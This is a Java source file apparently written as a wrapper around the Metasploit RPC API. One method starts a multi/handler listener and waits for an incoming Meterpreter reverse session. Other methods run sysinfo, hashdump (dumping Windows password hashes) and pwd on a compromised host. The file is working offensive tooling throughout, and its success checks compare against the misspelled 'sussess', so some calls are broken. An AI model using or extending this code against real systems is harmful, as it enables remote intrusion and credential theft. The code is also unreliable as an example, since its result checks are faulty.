/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package msf;

import java.lang.annotation.Documented;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import msf.ApiController;
import msf.models.MsgPackRpc;
import org.json.simple.JSONObject;

/**
 *
 * @author yasmir
 */
public class BIL {

    public String token;
    MsgPackRpc msg;
    ApiController api;

    public BIL() {
        msg = new MsgPackRpc();
        api = new ApiController(msg);
    }

    public JSONObject deviceSessionList() {
        JSONObject resJson = api.getSessionList(token);
        if (resJson.size() > 0) {
            return resJson;
        }
        else{
            return null;
        }
    }

    public String createHandler(String _lhost, String _lport, String _payload) throws InterruptedException {
        String consoleID = api.consoleCreate(token);
        if (!consoleID.isEmpty()) {
            api.consoleWrite(consoleID, "use exploit/multi/handler\n",token);
            Thread.sleep(500);
            api.consoleWrite(consoleID, "set PAYLOAD " + _payload + "\n",token);
            Thread.sleep(500);
            api.consoleWrite(consoleID, "set LHOST "   + _lhost   + "\n",token);
            Thread.sleep(500);
            api.consoleWrite(consoleID, "set LPORT "   + _lport   + "\n",token);
            Thread.sleep(500);
            api.consoleWrite(consoleID, "show options\n",token);
            Thread.sleep(500);
            api.consoleWrite(consoleID, "exploit\n",token);
            Thread.sleep(500);
            
            JSONObject readJson = api.consoleRead(consoleID,token);
            // print in console log
            System.out.println(readJson.get("data").toString());
            
            while (true) {
                Thread.sleep(1000);
                
                readJson = api.consoleRead(consoleID, token);
                if (readJson.get("data") != null) {
                    String data = readJson.get("data").toString();

                    if (!data.isEmpty() && data.contains("opened") && data.contains("[*] Meterpreter session")) {
                        System.out.println(readJson.get("data").toString());
                        return consoleID;
                    }
                }
            }
            
        }

       /* Map params = new HashMap();
        params.put("LHOST", _lhost);
        params.put("LPORT", _lport);
        params.put("PAYLOAD", _payload);

        JSONObject job_id = api.moduleExecute("exploit", "exploit/handler", params);*/
        return null;
    }

    public JSONObject Login(String _host, int _port, String _userName, String _password) {
        msg.Connect(_host, _port, false);
        JSONObject login_Result_json = msg.rpcCall("auth.login", _userName, _password);
        return login_Result_json;
    }
    /**
     * target system information
     *
     * @param SessionID
     * @return string
     */
    public String meterpreter_SysInfo(String SessionID) {

        try {
            JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "sysinfo");
            JSONObject console_read_result = meterpreter_Read(SessionID);

            return console_read_result.get("data").toString();

        } catch (Exception e) {
            throw e;
        }
    }

    /**
     * dump windows password hash from target
     *
     * @param SessionID
     * @return
     */
    public String meterpreter_HashDump(String SessionID) throws Exception {

        JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "hashdump");
        if (Result_json.get("result").equals("sussess")) {
            JSONObject console_read_result = meterpreter_Read(SessionID);
            return console_read_result.get("data").toString();
        } else {
            throw new Exception("Error in execute command");
        }

    }

    public String meterpreter_FS_PWD(String SessionID) throws Exception {

        JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "pwd");
        if (Result_json.get("result").equals("sussess")) {
            JSONObject console_read_result = meterpreter_Read(SessionID);
            return console_read_result.get("data").toString();
        } else {
            throw new Exception("Error in execute command");
        }

    }

    private JSONObject meterpreter_Read(String SessionID) {
        JSONObject Result_json = msg.rpcCall("session.meterpreter_read", token, SessionID);
        return Result_json;
    }

}
